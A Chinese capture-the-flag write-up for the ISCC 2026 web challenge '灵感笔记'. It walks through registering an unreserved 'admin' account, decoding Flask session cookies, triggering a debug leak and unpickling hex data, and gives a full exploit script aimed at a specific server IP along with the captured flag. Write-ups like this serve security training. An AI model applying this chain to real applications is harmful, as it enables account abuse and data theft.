# 灵感笔记

> **Category**: Web | **Difficulty**: Medium | **Competition**: ISCC 2026 区域赛
> **Flag**: `ISCC{epGFk8uufXeN7RkWwnaufuwfr}`

---

## Attack Chain

```
注册admin账户 → 解码Flask Session Cookie发现隐藏笔记ID → 调用API触发访问拒绝 → 新Cookie含pickle序列化数据 → 反序列化提取flag
```

## Key Techniques

### 1. 信息收集与注册 admin 账户

访问首页，Response Headers 确认后端为 Python Flask：

```
Server: Werkzeug/2.3.7 Python/3.11.15
Set-Cookie: session=.eJyd...; HttpOnly; Path=/; SameSite=Lax
```

点击"创建账号"注册用户名 `admin`，系统未对 admin 做保留限制，注册成功即获管理员身份。

Dashboard 页面源码中发现隐藏元素：

```html
<input type="hidden" id="is-admin" value="true">
<div id="admin-hint" style="display:none;"></div>
```

### 2. 发现关键 API 接口

查看 `main.js` 源码，发现 `fetchAdminHint()` 函数会请求 `/api/admin/hint`，浏览器 Console 输出：

```
POST /api/v1/project/detail HTTP/1.1
{"project_id": "<project-id>"}
```

### 3. 解码 Flask Session Cookie 发现隐藏笔记 ID

Flask Session Cookie 格式为 `base64(zlib(JSON数据)).时间戳.签名`，数据存在客户端可解码：

```python
import base64, zlib, json

raw = session_cookie.lstrip('.')
last_dot = raw.rfind('.')
second_dot = raw.rfind('.', 0, last_dot)
payload_b64 = raw[:second_dot]
payload_b64 += '=' * (4 - len(payload_b64) % 4)
decoded = base64.urlsafe_b64decode(payload_b64)
data = json.loads(zlib.decompress(decoded))
```

解码结果中发现隐藏笔记 ID：`flag-project-001`

### 4. API 触发获取含调试信息的新 Cookie

```python
resp = requests.post("/api/v1/project/detail",
    json={"project_id": "flag-project-001"},
    cookies={"session": session_cookie})
# 返回403，但新Cookie的logs字段含调试信息
```

### 5. Pickle 反序列化提取 Flag

`stack_trace` 字段中 `Object: ` 后面的十六进制字符串是 pickle 序列化数据：

```python
hex_data = stack_trace.replace('Object: ', '')
obj = pickle.loads(bytes.fromhex(hex_data))
# → {'flag': 'ISCC{...}', 'type': 'FLAG_OBJECT'}
```

## Exploit

```python
import requests, base64, zlib, json, pickle, pprint

BASE_URL = "http://39.105.213.28:5000"

# Step 1: 注册/登录获取 Session Cookie
session = requests.Session()
session.post(f"{BASE_URL}/register", data={"username": "admin", "password": "admin123"})
session.post(f"{BASE_URL}/login", data={"username": "admin", "password": "admin123"})
session_cookie = session.cookies.get("session")

# Step 2: 解码 Flask Session Cookie，提取 project_id
raw = session_cookie.lstrip('.')
last_dot = raw.rfind('.')
second_dot = raw.rfind('.', 0, last_dot)
payload_b64 = raw[:second_dot]
payload_b64 += '=' * (4 - len(payload_b64) % 4)
data = json.loads(zlib.decompress(base64.urlsafe_b64decode(payload_b64)))

project_id = None
for note in data.get('notes', []):
    if 'flag' in note['id'].lower():
        project_id = note['id']

# Step 3: 调用 API 触发访问拒绝，获取新 Cookie
resp = requests.post(
    f"{BASE_URL}/api/v1/project/detail",
    json={"project_id": project_id},
    cookies={"session": session_cookie})
new_cookie = resp.cookies.get("session")

# Step 4: 解码新 Cookie + Pickle 反序列化提取 Flag
raw = new_cookie.lstrip('.')
last_dot = raw.rfind('.')
second_dot = raw.rfind('.', 0, last_dot)
payload_b64 = raw[:second_dot]
payload_b64 += '=' * (4 - len(payload_b64) % 4)
data = json.loads(zlib.decompress(base64.urlsafe_b64decode(payload_b64)))

for log_id, log_data in data.get('logs', {}).items():
    stack_trace = log_data.get('stack_trace', '')
    if stack_trace:
        hex_data = stack_trace.replace('Object: ', '')
        obj = pickle.loads(bytes.fromhex(hex_data))
        print(f"FLAG: {obj.get('flag')}")
```

**运行结果：**

```
[*] Target project_id: flag-project-001
[*] API Status: 403
[+] FLAG: ISCC{epGFk8uufXeN7RkWwnaufuwfr}
{'flag': 'ISCC{epGFk8uufXeN7RkWwnaufuwfr}',
 'project_id': 'flag-project-001',
 'type': 'FLAG_OBJECT'}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| Flask Session | 客户端存储, base64+zlib+签名，可解码 |
| 注册admin | 未做保留字限制 |
| Pickle反序列化 | 调试信息泄露序列化对象 |
| 信息串联 | Cookie解码→API调用→新Cookie→flag |

---

*Original writeup: `C:\Users\48714\Desktop\wp\区域赛\灵感笔记_WriteUp_final.md`*
